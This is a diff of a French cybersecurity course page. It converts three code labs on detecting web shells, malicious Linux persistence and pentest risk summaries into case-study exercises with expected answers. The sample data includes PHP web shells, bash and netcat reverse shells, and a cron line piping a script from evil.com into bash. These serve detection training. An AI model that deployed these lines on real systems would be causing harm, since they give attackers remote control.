@@ -17,6 +17,7 @@
 <link rel="stylesheet" href="/assets/css/tokens.css">
 <link rel="stylesheet" href="../assets/css/cours.css">
 <link rel="stylesheet" href="/assets/css/code-lab.css">
+<link rel="stylesheet" href="/assets/vendor/katex/katex.min.css">
 <script src="/assets/js/theme.js"></script>
 </head>
 <body data-chapter="6">
@@ -189,27 +190,33 @@ level: critical</code></pre>
 </table>
 
 <!-- code-labs:start -->
-  <h2>6. Exercices de code</h2>
-  <p class="lead">Ces trois exercices se font dans la page. L’éditeur du navigateur exécute votre code
-  sur un service distant, puis la validation fait tourner des tests que vous ne voyez pas :
-  réussir l’exemple affiché ne suffit donc pas, il faut traiter le cas général.</p>
-  <p>En cas d’erreur, le bouton <strong>Expliquer mon erreur</strong> interroge le tuteur : il décrit ce qui
-  s’est passé et par où chercher, sans jamais écrire de code à votre place — c’est le principe de l’exercice.</p>
+  <h2>6. Études de cas &amp; applications pratiques</h2>
+  <p class="lead">Ces trois études de cas se réalisent directement dans la page. Complétez chaque grille d’analyse à partir des données du cas, puis lancez la validation pour vérifier vos réponses critère par critère.</p>
+  <p>En cas d’hésitation, le bouton <strong>Expliquer mon erreur</strong> sollicite le tuteur pédagogique pour vous guider dans l’application de la méthodologie sans donner directement la solution.</p>
 <div class="lab" data-lab
      data-exercise="hk3-c6-e1"
-     data-language="python"
+     data-language="analyse"
      data-height="300"
      data-stdin="SCAN_SCRIPT code=&lt;?php if(isset($_REQUEST[&quot;cmd&quot;])){ system($_REQUEST[&quot;cmd&quot;]); } ?&gt;">
-  <script type="text/plain" data-lab-starter>import sys
+  <script type="text/plain" data-lab-starter># Grille d'analyse (hk3-c6-e1) — Détecteur de Web Shells et Obfuscation de Scripts Malveillants
+# Complétez la résolution demandée sous chaque cas ci-dessous :
 
-lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+[Cas 1 — Web shell fortement obfusqué combinant eval, base64 et entrées POST]
+# Données : SCAN_SCRIPT code=<?php eval(base64_decode($_POST["payload"])); ?>
+A_COMPLETER
 
-# À compléter : calculer le score de suspicion de web shell
+[Cas 2 — Script suspect utilisant uniquement base64_decode]
+# Données : SCAN_SCRIPT code=<?php $logo = base64_decode("iVBORw0KGgoAAAANSUhEUg=="); ?>
+A_COMPLETER
+
+[Cas 3 — Script légitime de template sans fonction dangereuse]
+# Données : SCAN_SCRIPT code=<?php echo "<h1>Bienvenue sur le portail</h1>"; ?>
+A_COMPLETER
 </script>
   <div class="lab__head">
     <h3 class="lab__title">Exercice 1 — Détecteur de Web Shells et Obfuscation de Scripts Malveillants</h3>
     <div class="lab__meta">
-      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
       <span class="badge badge--n1">Niveau 1 — Acquisition</span>
     </div>
   </div>
@@ -228,8 +235,8 @@ Classification finale :<br>
 Entrée STDIN : <code>SCAN_SCRIPT code=&lt;extrait_de_code&gt;</code>.<br>
 Sortie : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt;risk&gt;</code>.</p></div>
     <div class="lab__sample">
-      <div class="lab__sample-part"><b>Entrée du programme</b><pre>SCAN_SCRIPT code=&lt;?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?&gt;</pre></div>
-      <div class="lab__sample-part"><b>Sortie attendue</b><pre>WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL</pre></div>
+      <div class="lab__sample-part"><b>Cas d’exemple</b><pre>SCAN_SCRIPT code=&lt;?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?&gt;</pre></div>
+      <div class="lab__sample-part"><b>Résolution attendue</b><pre>WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL</pre></div>
     </div>
     <p class="lab__note">Web shell PHP classique à une ligne combinant system et $_REQUEST.</p>
     <details class="lab__hints">
@@ -245,19 +252,28 @@ Sortie : <code>WEBSHELL_SCAN: score=&lt;score&gt; status=&lt;status&gt; risk=&lt
 
 <div class="lab" data-lab
      data-exercise="hk3-c6-e2"
-     data-language="python"
+     data-language="analyse"
      data-height="300"
      data-stdin="PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1">
-  <script type="text/plain" data-lab-starter>import sys
+  <script type="text/plain" data-lab-starter># Grille d'analyse (hk3-c6-e2) — Analyseur de Persistance Linux (Crontab & Reverse Shells)
+# Complétez la résolution demandée sous chaque cas ci-dessous :
 
-lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+[Cas 1 — Reverse shell netcat avec redirection de binaire shell]
+# Données : PERSIST_AUDIT type=SERVICE command=ExecStart=/bin/nc -e /bin/sh 192.168.1.100 9001
+A_COMPLETER
 
-# À compléter : détecter les reverse shells dans les persistances
+[Cas 2 — Persistance par téléchargement et exécution de script distant]
+# Données : PERSIST_AUDIT type=CRON command=@reboot curl -s http://evil.com/implant.sh | bash
+A_COMPLETER
+
+[Cas 3 — Tâche cron légitime de sauvegarde et synchronisation]
+# Données : PERSIST_AUDIT type=CRON command=0 2 * * * /usr/bin/rsync -avz /data /backup
+A_COMPLETER
 </script>
   <div class="lab__head">
     <h3 class="lab__title">Exercice 2 — Analyseur de Persistance Linux (Crontab &amp; Reverse Shells)</h3>
     <div class="lab__meta">
-      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
       <span class="badge badge--n2">Niveau 2 — Application</span>
     </div>
   </div>
@@ -277,8 +293,8 @@ Règles de diagnostic :<br>
 Entrée STDIN : <code>PERSIST_AUDIT type=&lt;CRON|SERVICE|SCRIPT&gt; command=&lt;commande&gt;</code>.<br>
 Sortie : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; signature=&lt;sig&gt; risk=&lt;risk&gt;</code>.</p></div>
     <div class="lab__sample">
-      <div class="lab__sample-part"><b>Entrée du programme</b><pre>PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</pre></div>
-      <div class="lab__sample-part"><b>Sortie attendue</b><pre>PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL</pre></div>
+      <div class="lab__sample-part"><b>Cas d’exemple</b><pre>PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</pre></div>
+      <div class="lab__sample-part"><b>Résolution attendue</b><pre>PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL</pre></div>
     </div>
     <p class="lab__note">Tâche cron récurrente établissant un reverse shell interactif vers l'attaquant.</p>
     <details class="lab__hints">
@@ -294,19 +310,28 @@ Sortie : <code>PERSIST_RESULT: type=&lt;type&gt; malicious=&lt;TRUE|FALSE&gt; si
 
 <div class="lab" data-lab
      data-exercise="hk3-c6-e3"
-     data-language="python"
+     data-language="analyse"
      data-height="300"
      data-stdin="PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW">
-  <script type="text/plain" data-lab-starter>import sys
+  <script type="text/plain" data-lab-starter># Grille d'analyse (hk3-c6-e3) — Générateur de Synthèse Managériale et Matrice de Risque de Pentest
+# Complétez la résolution demandée sous chaque cas ci-dessous :
 
-lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+[Cas 1 — Infrastructure avec failles élevées multiples sans faille critique]
+# Données : PENTEST_SYNTHESIS findings=xss_stored:HIGH,idor_api:HIGH,weak_password_policy:MEDIUM
+A_COMPLETER
 
-# À compléter : générer la synthèse managériale de pentest
+[Cas 2 — Environnement sain avec deux failles mineures d'en-tête]
+# Données : PENTEST_SYNTHESIS findings=missing_csp:LOW,server_banner:LOW
+A_COMPLETER
+
+[Cas 3 — Cumul de failles moyennes atteignant le seuil d'exposition modérée]
+# Données : PENTEST_SYNTHESIS findings=cors_wildcard:MEDIUM,rate_limit_bypass:MEDIUM,directory_listing:MEDIUM
+A_COMPLETER
 </script>
   <div class="lab__head">
     <h3 class="lab__title">Exercice 3 — Générateur de Synthèse Managériale et Matrice de Risque de Pentest</h3>
     <div class="lab__meta">
-      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-book"></use></svg> Étude de cas</span>
       <span class="badge badge--n3">Niveau 3 — Raisonnement</span>
     </div>
   </div>
@@ -328,8 +353,8 @@ Entrée STDIN : <code>PENTEST_SYNTHESIS findings=&lt;f1:sev1,f2:sev2,...&gt;</co
 Sortie :<br>
 <code>PENTEST_SUMMARY: total_findings=&lt;N&gt; critical=&lt;C&gt; high=&lt;H&gt; medium=&lt;M&gt; low=&lt;L&gt; risk_score=&lt;score&gt; posture=&lt;posture&gt;</code>.</p></div>
     <div class="lab__sample">
-      <div class="lab__sample-part"><b>Entrée du programme</b><pre>PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW</pre></div>
-      <div class="lab__sample-part"><b>Sortie attendue</b><pre>PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL</pre></div>
+      <div class="lab__sample-part"><b>Cas d’exemple</b><pre>PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW</pre></div>
+      <div class="lab__sample-part"><b>Résolution attendue</b><pre>PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL</pre></div>
     </div>
     <p class="lab__note">Une vulnérabilité critique déclenche immédiatement la posture COMPROMISED_CRITICAL.</p>
     <details class="lab__hints">
@@ -503,6 +528,29 @@ Sortie :<br>
 </main>
 
 <script src="../assets/js/cours.js"></script>
+<script src="/assets/vendor/katex/katex.min.js" defer></script>
+<script src="/assets/vendor/katex/auto-render.min.js" defer></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    function initMath() {
+      if (typeof renderMathInElement === "function") {
+        renderMathInElement(document.body, {
+          delimiters: [
+            {left: "$$", right: "$$", display: true},
+            {left: "\\[", right: "\\]", display: true},
+            {left: "$", right: "$", display: false},
+            {left: "\\(", right: "\\)", display: false}
+          ],
+          ignoredTags: ["script", "noscript", "style", "textarea", "pre", "code"],
+          throwOnError: false
+        });
+      } else {
+        setTimeout(initMath, 50);
+      }
+    }
+    initMath();
+  });
+</script>
 <script src="/assets/js/code-lab.js" defer></script>
 </body>
 </html>
